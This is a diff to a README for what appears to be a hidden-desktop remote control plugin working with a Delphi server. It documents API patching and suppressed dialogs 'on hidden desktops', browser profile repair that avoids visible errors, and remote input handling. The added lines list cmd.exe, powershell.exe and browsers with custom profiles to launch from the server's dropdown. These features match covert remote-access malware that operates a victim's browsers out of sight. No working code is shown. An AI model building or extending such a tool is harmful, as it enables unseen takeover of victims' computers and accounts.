@@ -17,3 +17,14 @@ The rewritten C++ plugin remains **fully compatible** with the current Delphi se
   - Verification & self-repair of corrupt Chromium Preferences and Local State files to prevent "profile error" boxes.
   - Asynchronous background threads for patching Opera's `user32.dll!GetCursorInfo` API and suppressing standard Rundll32 mscories installer dialogs on hidden desktops.
 - **Smart Input**: Improved hit testing (`RefineNCHit`), mouse dragging support, and accurate `ToUnicode` translation with active key state tracking for high-fidelity control.
+
+#### 3. Supported ComboBox Items for Process Launching (ComboBox2)
+The following item names are fully supported and should be added to the Delphi Server's dropdown (ComboBox2 on TForm10) for seamless execution:
+- `cmd.exe`
+- `powershell.exe`
+- `explorer.exe`
+- `Google Chrome` (starts Chrome with custom sandboxed profile)
+- `Microsoft Edge` (starts Edge with custom sandboxed profile)
+- `Firefox` (starts Firefox with custom sandboxed profile)
+- `Waterfox` (starts Waterfox with custom profile)
+- `LibreWolf` (starts LibreWolf with custom profile)
